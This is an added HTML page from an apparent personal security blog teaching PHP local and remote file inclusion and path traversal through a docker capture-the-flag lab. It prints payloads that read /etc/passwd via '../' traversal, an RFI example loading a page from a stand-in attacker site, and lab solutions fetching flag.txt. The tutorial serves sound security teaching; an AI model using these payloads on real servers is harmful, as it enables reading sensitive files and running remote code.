@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>It's me AnonArtist</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="../assets/img/favicon.png" rel="icon">
+  <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="../assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+  <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="../assets/css/style.css" rel="stylesheet">
+</head>
+
+<body>
+
+  <!-- ======= Header ======= -->
+  <header id="about" class="about">
+    <div class="about-me container">
+    <div class="section-title">
+    &nbsp;&nbsp;&nbsp;<br><br>
+        <h2>Code Review Series: 1</h2>
+        <p>File Inclusion Vulnerability and Path Traversal Attack in PHP</p>
+      </div>
+      <div class="row">
+        <div class="col-lg-8 pt-4 pt-lg-0 content">
+          <h3>Hi,</h3>
+          <p class="font-italic">
+          It's me Abhiram aka AnonArtist this is <b>Code Review Series</b> and here we talk about some vulnerabilities and how to exploit them.<br>So let's start from File Inclusion vulnerability in PHP<br>The File Inclusion attacks are of two types: Local File Inclusion and Remote File Inclusion (LFI & RFI respectively).<br>LFI is a vulnerability which allows the attacker to access unauthorized or sensitive files available on the local server for example (http://victim.com/vulnerable.php?test=../../../../etc/passwd) whereas RFI allows the attacker to access any files or execute malicious files on remote servers for example ( http://victim.com/vulnerable.php?test=http://www.attacker_site.com/malicious_page) both of which work by making use of the included or require functionality.<br>Let us see some example<br>I have added some vulnerable example, what you need to do is access the flag.txt from the home directory<br>You can git clone the lab from <a href="https://github.com/Anon-Artist/Code Review Lab">Code Review Lab</a>
+<h2>Lab Setup</h2>1. Install docker and docker-compose<br>2. Open  the exercise Folder<br>3. Open a terminal and type the command as follows:<br>&nbsp;&nbsp;sudo docker-compose up -d<br>4. Now we can access the challenge from the browser in 7001 and 7002 port<br>&nbsp;&nbsp;(http://127.0.0.1:7001 & http://127.0.0.1:7002 respectively)<br><br><br></p><p class="font-italic"> <b>Exercise-1 :</b><br><br>
+The vulnerable code is<br><br><img src="blog5/exercise1.png" alt="Code for exercise 1" width="271" height="152"><br>Here from the PHP code, we can clearly understand that there is a GET parameter namely 'file' is used and which uses the included functionality which is vulnerable to file inclusion attack and this is a GET request so that we can perform this from browser URL itself.</p><p class="font-italic"><b>Solution :</b><br><br>http://127.0.0.1:7001/index.php?file=/home/flag.txt
+<br><br><br></p><p class="font-italic"> <b>Exercise-2 :</b><br><br>
+The vulnerable code is<br><br><img src="blog5/exercise2.png" alt="Code for exercise 2" width="390" height="207"><br>This challenge is the same as Exercise-1 but the difference is here we can't directly use /etc/password or anything because the parameter is not called from its root directory so we need to do a <b>path traversal attack</b>.<br>A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder by manipulating variables that reference files with “dot-dot-slash (../)”<br><br>So do the same what we did in Exercise-1 and use ../ to go back to the root directory.</p><p class="font-italic"><b>Solution :</b><br><br>http://127.0.0.1:7002/index.php?file=../../../../../home/flag.txt
+<br><br><h3>Outcomes</h3>* Learned File Inclusion Vulnerability<br>
+* Learned Path Traversal Attack<br><h3>Some Realworld References</h3><a href="https://snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-1070132">* CVE-2021-23340 PIMCORE Local File Inclusion</a><br>
+<a href="https://packetstormsecurity.com/files/158333/BIG-IP-TMUI-Remote-Code-Execution.html">* CVE-2020-5902 F5 Big-IP Local File Inclusion</a><br><br>
+<b>Now go and do the Labs ;) Lets see in next post</b>
+<br><br><br>
+<center><b>THANK YOU For Reading my blog post</b></center><br></p><br>
+        </div>
+      </div>
+
+    </div><!-- End About Me -->
+
+    </div>
+  </header><!-- End Header -->
+  <div class="credits">
+    <!-- All the links in the footer should remain intact. -->
+    <!-- You can delete the links only if you purchased the pro version. -->
+    <!-- Licensing information: https://bootstrapmade.com/license/ -->
+    <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/personal-free-resume-bootstrap-template/ -->
+  </div>
+
+  <!-- Vendor JS Files -->
+  <script src="../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="../assets/vendor/php-email-form/validate.js"></script>
+  <script src="../assets/vendor/purecounter/purecounter.js"></script>
+  <script src="../assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="../assets/vendor/waypoints/noframework.waypoints.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="../assets/js/main.js"></script>
+
+</body>
+
+</html>
